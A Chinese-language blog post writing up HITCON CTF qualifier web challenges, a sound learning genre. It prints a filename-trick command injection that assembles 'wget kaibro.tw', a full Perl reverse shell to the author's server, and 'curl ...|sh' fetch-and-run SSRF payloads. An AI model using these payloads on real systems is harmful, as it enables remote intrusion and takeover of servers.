<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <title>HITCON CTF初賽 | Kaibro&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/earlyaccess/notosanstc.css">
  <meta name="description" content="我來打醬油的好像都沒貢獻到啥QQ 來記錄一下Web簡單題的解法和幾題賽中有碰，但沒解出來的QQ Baby First Revenge v1這題和隊友討論很久才搞定QQ其實一開始我們的方向就是正確的比賽剛開始就在想，利用&amp;gt;ls之類的寫檔再用ls&amp;gt;z，把產生的那些檔名塞到另一個檔案最後串成指令去sh z跑 但後來發現ls會有順序問題，難搞定思路就愈走愈偏了QQ">
<meta name="keywords" content="CTF,Web">
<meta property="og:type" content="article">
<meta property="og:title" content="HITCON CTF初賽">
<meta property="og:url" content="http://blog.kaibro.tw/2017/11/07/HITCON-CTF初賽/index.html">
<meta property="og:site_name" content="Kaibro&#39;s blog">
<meta property="og:description" content="我來打醬油的好像都沒貢獻到啥QQ 來記錄一下Web簡單題的解法和幾題賽中有碰，但沒解出來的QQ Baby First Revenge v1這題和隊友討論很久才搞定QQ其實一開始我們的方向就是正確的比賽剛開始就在想，利用&amp;gt;ls之類的寫檔再用ls&amp;gt;z，把產生的那些檔名塞到另一個檔案最後串成指令去sh z跑 但後來發現ls會有順序問題，難搞定思路就愈走愈偏了QQ">
<meta property="og:image" content="https://i.imgur.com/I7szGI7.png">
<meta property="og:updated_time" content="2017-11-08T09:41:16.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="HITCON CTF初賽">
<meta name="twitter:description" content="我來打醬油的好像都沒貢獻到啥QQ 來記錄一下Web簡單題的解法和幾題賽中有碰，但沒解出來的QQ Baby First Revenge v1這題和隊友討論很久才搞定QQ其實一開始我們的方向就是正確的比賽剛開始就在想，利用&amp;gt;ls之類的寫檔再用ls&amp;gt;z，把產生的那些檔名塞到另一個檔案最後串成指令去sh z跑 但後來發現ls會有順序問題，難搞定思路就愈走愈偏了QQ">
<meta name="twitter:image" content="https://i.imgur.com/I7szGI7.png">
  
    <link rel="alternative" href="/atom.xml" title="Kaibro&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="https://avatars.plurk.com/10562062-big32.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">KaiBro</a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						
						<div class="icon-wrap icon-me hide" data-idx="3">
							<div class="user"></div>
							<div class="shoulder"></div>
						</div>
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>Menu</li>
						<li>Tags</li>
						
						
						<li>Über</li>
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主頁</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
					        
								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
					        
								<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/BugBounty/" style="font-size: 10px;">BugBounty</a> <a href="/tags/CTF/" style="font-size: 18px;">CTF</a> <a href="/tags/Linux/" style="font-size: 12px;">Linux</a> <a href="/tags/NCU/" style="font-size: 14px;">NCU</a> <a href="/tags/NTU/" style="font-size: 12px;">NTU</a> <a href="/tags/Pwn/" style="font-size: 16px;">Pwn</a> <a href="/tags/Web/" style="font-size: 16px;">Web</a> <a href="/tags/筆記/" style="font-size: 20px;">筆記</a> <a href="/tags/開箱/" style="font-size: 10px;">開箱</a> <a href="/tags/開箱文/" style="font-size: 10px;">開箱文</a>
					</div>
				</section>
				
				
				

				
				
				<section class="switch-part switch-part3">
				
					<div id="js-aboutme">安安，我是Kaibro，目前是112電機所CS組的苦命爆肝菸酒生</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">KaiBro</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
			
				<img lazy-src="https://avatars.plurk.com/10562062-big32.jpg" class="js-avatar">
			
			</div>
			<hgroup>
			  <h1 class="header-author">KaiBro</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主頁</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
			        
						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
			        
						<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>

      <div class="body-wrap"><article id="post-HITCON-CTF初賽" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/11/07/HITCON-CTF初賽/" class="article-date">
  	<time datetime="2017-11-07T05:35:17.000Z" itemprop="datePublished">2017-11-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      HITCON CTF初賽
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
	</div>

        

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>我來打醬油的<br>好像都沒貢獻到啥QQ</p>
<p>來記錄一下Web簡單題的解法<br>和幾題賽中有碰，但沒解出來的QQ</p>
<h2 id="Baby_First_Revenge_v1"><a href="#Baby_First_Revenge_v1" class="headerlink" title="Baby First Revenge v1"></a>Baby First Revenge v1</h2><p>這題和隊友討論很久才搞定QQ<br>其實一開始我們的方向就是正確的<br>比賽剛開始就在想，利用<code>&gt;ls</code>之類的寫檔<br>再用<code>ls&gt;z</code>，把產生的那些檔名塞到另一個檔案<br>最後串成指令去<code>sh z</code>跑</p>
<p>但後來發現ls會有順序問題，難搞定<br>思路就愈走愈偏了QQ<br><a id="more"></a><br><br></p>
<p>後來我們搞老半天<br>成功想到可以這樣去爆所有檔案路徑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;find</div><div class="line">* /&gt;z</div></pre></td></tr></table></figure></p>
<p>然後發現<code>/home/fl4444g/</code>下有一個README.txt<br>接著就想辦法去讀它</p>
<p>後來終於構造出<code>tar vcf a /</code>，把整個root打包起來下載(1.4G左右)<br>打開<code>/home/fl4444g/README.txt</code>看，崩潰<br>他給你mysql帳號密碼，說flag在裡面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Flag is in the MySQL database</div><div class="line">fl4444g / SugZXUtgeJ52_Bvr</div></pre></td></tr></table></figure>
<p>所以基本上就是要拿shell惹QQ</p>
<p><br></p>
<p>我後來是發現有<code>lsof</code>可以用<br>可以看其他人在幹啥XDDD<br>甚至也可以拿到別人的ip hash  (( 就是<code>md5(&#39;orange&#39;.ip);</code><br>這一招真的對我們幫助很大XD<br><img src="https://i.imgur.com/I7szGI7.png" alt=""></p>
<p>因為我發現很多人卡著shell<br>就用他們的hash去看目錄下有啥<br>意外的大家目錄下都有<code>index.html</code></p>
<p>然後內容都是reverse shell連線command<br>再看一下目錄下其他檔案<br>就大概能猜出<br>他們是用<code>wget</code>載他們server上的index.html<br>然後<code>sh i*</code>去reverse shell連回去</p>
<p>想通這點，後面就很快了<br>就只要想辦法構造wget kaibro.tw之類的<br>這部分會蠻吃域名名稱的<br>如果域名是abcde.tw之類的會很難構造XD<br>隊友還因此買了一個x開頭的短域名<br>然後就秒構造一個payload拿到shell了</p>
<p>我後來認真構造一下<br>終於能成功執行<code>wget kaibro.tw</code>惹</p>
<p>payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&gt;echo</div><div class="line">&gt;wg\</div><div class="line">*&gt;.a</div><div class="line">rm w*</div><div class="line">&gt;et</div><div class="line">&gt;ka\</div><div class="line">*&gt;&gt;.a</div><div class="line">rm e*</div><div class="line">rm k*</div><div class="line">&gt;echo</div><div class="line">&gt;ibr\</div><div class="line">*&gt;&gt;.a</div><div class="line">rm i*</div><div class="line">&gt;o.t\</div><div class="line">*&gt;&gt;.a</div><div class="line">rm o*</div><div class="line">&gt;w</div><div class="line">*&gt;&gt;.a</div></pre></td></tr></table></figure>
<p>結尾用<code>\</code>可以把多行指令串起來<br><code>*</code>可以把當前目錄下文件名展開當作指令跑</p>
<p>(看起來很簡單，實際上自己踹，會發現很多細節要注意)</p>
<p>執行完上面那坨之後<br>我們目錄下的<code>.a</code>就會長得像：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wg\</div><div class="line">et ka\</div><div class="line">ibr\</div><div class="line">o.t\</div><div class="line">w</div></pre></td></tr></table></figure>
<p><br><br>接著在我的server上放<code>index.html</code>:</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e <span class="string">'use Socket;$i="kaibro.tw";$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></div></pre></td></tr></table></figure>
<p>所以只要<code>sh .a</code><br>就會執行wget下載reverse shell指令到index.html惹</p>
<p>然後讓server listen一下<br><code>nc -vl 5566</code></p>
<p>再來<code>sh i*</code>就會去run index.html上的指令惹<br>shell就彈出來了</p>
<p>彈出來之後去連mysql，然後就可以抓出FLAG惹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ mysql -u fl4444g -p</div><div class="line">Enter password: SugZXUtgeJ52_Bvr</div><div class="line"></div><div class="line">use fl4gdb;</div><div class="line">select * from this_is_the_fl4g;</div><div class="line">exit</div></pre></td></tr></table></figure>
<p><code>hitcon{idea_from_phith0n,thank_you:)}</code></p>
<p><br><br><br></p>
<p>順便一提，我在這題收集了很多hash<br>然後在SSRFme那題也可以看別人在幹啥XD<br>只是都沒看到啥有用的<br>可能太晚收集了，沒收集到強隊的hash QQ<br>甚至還有人故意在127.0.0.1的目錄下塞假flag<br>我一開始還以為是有人讀出flag後忘記刪掉<br>一整個被騙，花了不少時間去確認</p>
<p>原本還想學他，再塞幾個假flag騙人，報復一下XD<br>後來想說算惹，就只塞了一個佛祖保佑圖<br>如果有人在SSRF這題看到，那87%就是我塞的XD</p>
<p><br></p>
<h2 id="Baby_Ruby_Escaping"><a href="#Baby_Ruby_Escaping" class="headerlink" title="Baby Ruby Escaping"></a>Baby Ruby Escaping</h2><p>這題搞很久，最後還是沒搞出來<br>隊上好像也沒人對ruby熟，所以一直放置著</p>
<p>看別人writeup才知道<br>原來socat連上後，按兩次tab就會顯示檔名…<br>超低能，都沒發現=.=<br>然後就可以用<code>ARGV&lt;&lt;&quot;thanks_readline_for_completing_the_name_of_flag&quot;</code><br>把檔名塞進argv中<br>之後直接<code>gets</code>，就會把裡面內容讀出來<br>(ruby會先去ARGV讀</p>
<p><code>hitcon{Bl4ckb0x.br0k3n? ? puts(flag) : try_ag4in!}</code></p>
<p>ruby is so hard QAQ</p>
<p><br></p>
<h2 id="Data__26amp_3B_mining"><a href="#Data__26amp_3B_mining" class="headerlink" title="Data &amp; mining"></a>Data &amp; mining</h2><p>這題一開始看很久<br>後來發現封包裡面有個地方連到xmrpool<br>推測他應該是在挖礦<br>跟題目名字和題目敘述也很吻合<br>告訴隊友後<br>隊友直接搜xmr就找到flag惹</p>
<p>不過…<br>後來我才知道直接搜hitcon就能看到flag了=.=<br>連wireshark都不用開 頗呵<br>難怪兩小時就30隊解掉，感覺題目沒設計好R<br><code>hitcon{BTC_is_so_expensive_$$$$$$$}</code></p>
<p><br></p>
<h2 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h2><p>這題也是賽中沒解出來<br>第二天一直在搞這題<br>整個方向都想偏了<br>一直以為要像Discuz Pwn一樣打某個服務</p>
<p>看了別人的write up<br>發現有人用一招很猥瑣的方式拿flag<br>類似這樣：<br><code>curl &#39;http://13.115.136.15/?url=a&amp;filename=|curl+http://kaibro.tw|sh&#39;</code><br><code>curl &#39;http://13.115.136.15/?url=file:|curl+http://kaibro.tw|sh&#39;</code></p>
<p>就是perl的GET看到file會去open本地檔案<br>然後跟AIS3講的ruby open一樣<br>可以在後面塞 | 去執行指令 =&gt; RCE</p>
<p>但是從source code可以看到，它會先去檢查檔案是否存在<br>所以必須先建立檔案</p>
<p>例如<code>filename=|ls</code>會去建立<code>|ls</code>這個檔案<br>然後<code>url=file:|ls</code>就會執行ls惹<br>可以用|sleep+10之類的來測試一下，會卡個一下，說明有成功執行</p>
<p>接著建立reverse shell，去跑/readflag就能拿flag惹<br><code>hitcon{Perl_&lt;3_y0u}</code></p>
<p>真的沒想到這題能這樣解，覺得奇技淫巧</p>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2017/12/13/Line-Bug-Bounty初體驗/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          Line Bug Bounty初體驗
        
      </div>
    </a>
  
  
    <a href="/2017/10/15/EDU-CTF-計算機安全/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">EDU-CTF 計算機安全</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>

  
</article>


<div class="share_jia">
	<!-- JiaThis Button BEGIN -->
	<div class="jiathis_style">
		<span class="jiathis_txt">Share to: &nbsp; </span>
		<a class="jiathis_button_facebook"></a> 
    <a class="jiathis_button_twitter"></a>
    <a class="jiathis_button_plus"></a> 
    <a class="jiathis_button_tsina"></a>
		<a class="jiathis_button_cqq"></a>
		<a class="jiathis_button_douban"></a>
		<a class="jiathis_button_weixin"></a>
		<a class="jiathis_button_tumblr"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
	</div>
	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
	<!-- JiaThis Button END -->
</div>








<section id="comments">
  <div id="disqus_thread"></div>
    <script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'kaibrosblog'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</section>

</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2018 KaiBro
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>


<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-61797645-2', 'auto');
  ga('send', 'pageview');

</script>



<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  </div>
</body>
</html>